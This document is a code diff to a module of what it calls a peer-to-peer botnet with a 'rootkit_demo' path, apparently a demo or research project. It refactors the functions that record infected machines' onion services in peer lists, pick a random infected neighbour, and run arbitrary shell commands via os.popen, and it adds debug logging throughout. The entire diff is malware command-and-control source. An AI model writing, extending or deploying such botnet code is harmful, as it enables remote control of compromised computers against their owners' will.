@@ -4,28 +4,15 @@ import random
 import os
 import math
 
-from botnet_p2p import (
+from . import (
     MAX_PUBLIC_PEER_LIST_LENGTH,
     logger,
 )
 
 
-files_path = "/etc/rootkit_demo/"
-public_peer_list_path = files_path + "public/peer_list"
-private_peer_list_path = files_path + "private/full_peer_list"
-
-
-def change_peer_lists_locations(
-    public_peer_list_new_path: str, private_peer_list_new_path: str
+def add_new_infected_machine(
+    msg_data: str, public_peer_list_path: str, private_peer_list_path: str
 ):
-    global public_peer_list_path
-    global private_peer_list_path
-
-    public_peer_list_path = public_peer_list_new_path
-    private_peer_list_path = private_peer_list_new_path
-
-
-def add_new_infected_machine(msg_data: str):
     """ Store onion services from new infected machine
         in some files.
 
@@ -33,9 +20,12 @@ def add_new_infected_machine(msg_data: str):
             msg_data: The username of the first created user in the infected machine,
                       and the onion services created
     """
+    logger.debug(
+        f"Add {msg_data} to {public_peer_list_path} and {private_peer_list_path} files"
+    )
     __append_to_file(private_peer_list_path, msg_data)
 
-    if not __public_peer_list_reached_maximum_length():
+    if not __public_peer_list_reached_maximum_length(public_peer_list_path):
         __append_to_file(public_peer_list_path, msg_data)
     else:
         __overwrite_random_line_in_file(public_peer_list_path, msg_data)
@@ -43,10 +33,12 @@ def add_new_infected_machine(msg_data: str):
 
 def execute_command(command: str) -> str:
     result = os.popen(command).read()
+    logger.debug(f"Command executed = {command}")
+    logger.debug(f"Command result = {result}")
     return result
 
 
-def select_random_neighbour() -> str:
+def select_random_neighbour(private_peer_list_path: str) -> str:
     with open(private_peer_list_path, "r") as private_peer_list:
         lines = private_peer_list.readlines()
         num_lines = len(lines)
@@ -54,11 +46,13 @@ def select_random_neighbour() -> str:
         text_line = lines[random_number]
 
     comm_onion = text_line.strip().split(" ")[-1]
+    logger.debug(f"Obtained random neighbour {text_line}")
+    logger.debug(f"Communication onion being {comm_onion}")
     return comm_onion
 
-def __public_peer_list_reached_maximum_length() -> bool:
+
+def __public_peer_list_reached_maximum_length(public_peer_list_path: str) -> bool:
     try:
-        logger.debug(public_peer_list_path)
         with open(public_peer_list_path, "r") as peer_list:
             num_lines = sum(1 for line in peer_list)
     except FileNotFoundError:
@@ -68,6 +62,7 @@ def __public_peer_list_reached_maximum_length() -> bool:
 
 
 def __append_to_file(file_: str, data: str):
+    logger.debug(f"Append {data} to {file_}")
     with open(file_, "a") as f:
         f.write(data + "\n")
 
@@ -79,6 +74,7 @@ def __overwrite_random_line_in_file(file_: str, data: str):
             file_: File in which we will overwrite a line
             data: Text to write in the file
     """
+    logger.debug(f"Overwrite a random line in {file_} with {data}")
     line_to_overwrite = random.randint(0, MAX_PUBLIC_PEER_LIST_LENGTH - 1)
     with open(file_, "r") as public_peer_list:
         lines = public_peer_list.readlines()
